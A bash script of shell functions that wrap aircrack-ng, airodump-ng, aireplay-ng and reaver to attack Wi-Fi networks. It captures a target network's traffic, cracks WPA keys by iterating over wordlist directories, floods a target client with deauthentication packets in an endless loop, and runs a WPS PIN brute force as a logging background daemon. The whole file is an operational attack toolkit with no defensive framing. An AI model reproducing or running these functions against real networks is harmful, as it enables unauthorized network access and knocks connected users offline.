#!/bin/bash

CAVAN_WIFI_PATH="/temp/cavan-wifi"

function cavan-wifi-mon-start()
{
	sudo airmon-ng start $1
}

function cavan-wifi-mon-stop()
{
	sudo airmon-ng stop $1
}

function cavan-wifi-mon-scan()
{
	sudo airodump-ng $1
}

function cavan-wifi-mon-capture()
{
	local pathname="${CAVAN_WIFI_PATH}/$(echo $1 | tr ':' '-')"

	echo "bssid = $1"
	echo "channel = $2"
	echo "interface = $3"
	echo "pathname = ${pathname}"

	echo "Press enter to start"
	read

	sudo mkdir -pv "${CAVAN_WIFI_PATH}"
	sudo airodump-ng -c $2 -w "${pathname}" --bssid $1 $3
}

function cavan-wifi-mon-crack()
{
	local words="$1"

	shift

	echo "words = ${words}"
	echo "datas = $*"

	if [ -d "${words}" ]
	then
		for fn in $(find "${words}" -type f -iname "*.txt")
		do
			date
			ls -lh "$fn"

			local key=$(aircrack-ng -w "$fn" $* | grep "KEY FOUND!" | sed 's/^.*\[ \(.*\) \].*$/\1/g' | uniq)
			[ -n "$key" ] &&
			{
				echo "key = '$key'"
				break
			}
		done
	else
		echo "Press enter to start"
		read
		aircrack-ng -w "${words}" $*
	fi
}

function cavan-wifi-mon-deauth()
{
	echo "ap_mac = $1"
	echo "client_mac = $2"
	echo "interface = $3"

	while :;
	do
		sudo aireplay-ng --ignore-negative-one -0 10 -a $1 -c $2 $3
	done
}

function cavan-wifi-minidwep-gtk()
{
	sudo bash /usr/local/bin/minileafdwep/minidwep-gtk.sh
}

function cavan-wifi-reaver()
{
	local args="-i $1 -b $2 -a -l 1 -vv -S"

	[ "$3" ] && args="$args -c $3"
	[ "$4" ] && args="$args -p $4 -d 30"

	echo "args = $args"

	reaver $args
}

function cavan-wifi-reaver-daemon()
{
	local pathname="${CAVAN_WIFI_PATH}/reaver-$(echo $2 | tr ':' '-').txt"

	echo "pathname = $pathname"

	mkdir -pv "${CAVAN_WIFI_PATH}"
	cavan-service --start -l "$pathname" --exec "source ${CAVAN_HOME}/script/app/wifi.sh && cavan-wifi-reaver $*"
}
